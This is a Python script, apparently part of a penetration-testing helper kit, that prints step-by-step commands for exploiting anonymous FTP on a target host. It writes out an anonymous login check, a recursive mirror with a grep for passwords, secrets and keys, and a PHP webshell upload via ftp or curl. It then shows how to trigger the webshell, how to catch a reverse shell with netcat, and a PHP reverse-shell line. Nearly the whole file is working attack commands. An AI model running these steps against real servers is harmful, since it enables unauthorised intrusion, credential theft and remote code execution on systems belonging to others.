#!/usr/bin/env python3
"""FTP (21) foothold via anonymous access. PRINTS commands. Edit LHOST in _services_common.py.

Usage:
  python3 gen_ftp.py anon   --target 10.0.0.5
  python3 gen_ftp.py upload --target 10.0.0.5 [--webroot http://10.0.0.5]   # writable + served as web root -> webshell
"""
import sys
import _services_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg = sys.argv[1] if len(sys.argv) > 1 else "anon"
t   = opt("--target", "<target>")
wr  = opt("--webroot", f"http://{t}")

if arg == "anon":
    print(f"# anonymous login (try anonymous:anonymous and anonymous:<blank>):")
    print(f"# needs: anonymous FTP enabled on the target.")
    print(f"ftp {t}        # user: anonymous  pass: anonymous")
    print(f"#   -> ok: you reach the `ftp>` prompt after '230 Login successful' = anonymous is allowed")
    print(f"nxc ftp {t} -u anonymous -p ''")
    print(f"#   -> ok: a '[+]' line = anonymous login confirmed (non-interactive check)")
    print(f"# mirror everything + hunt creds:")
    print(f"wget -m --no-passive ftp://anonymous:anonymous@{t}/ 2>/dev/null; grep -rIiE 'passw|secret|key' {t} | head")
    print(f"# found creds/config -> ../network/gen_shell.py.  A writable server -> upload.")

elif arg == "upload":
    print(f"# writable FTP — is the FTP root also the WEB root? (very common on old boxes) -> drop a webshell:")
    print(f"# needs: WRITE access over anonymous FTP, AND the FTP dir served by a web server that executes PHP.")
    print(f"echo '{P.WEBSHELL_PHP_NQ}' > s.php")
    print(f"# order: most-reliable-first — one-shot `curl -T` upload, else the interactive `ftp` session.")
    print(f"ftp {t}    # then:  binary; put s.php")
    print(f"#   or:  curl -T s.php ftp://anonymous:anonymous@{t}/")
    print(f"#   -> ok: '226 Transfer complete' (no '550 Permission denied') = the server is writable")
    print(f"# trigger it (find the web path):")
    print(f"curl '{wr}/s.php?0=id'    # -> then ?0=<urlencoded revshell>   catch: nc -lvnp {P.LPORT}")
    print(f"#   -> ok: the response body is the output of `id` = FTP root == web root and PHP executes")
    print(f"# not a web root? still useful: overwrite a script/config the server runs, or stage payloads/keys.")
    print(f"# revshell (if PHP works):  {P.revshell('php')}")
else:
    print("use: anon | upload"); sys.exit(1)
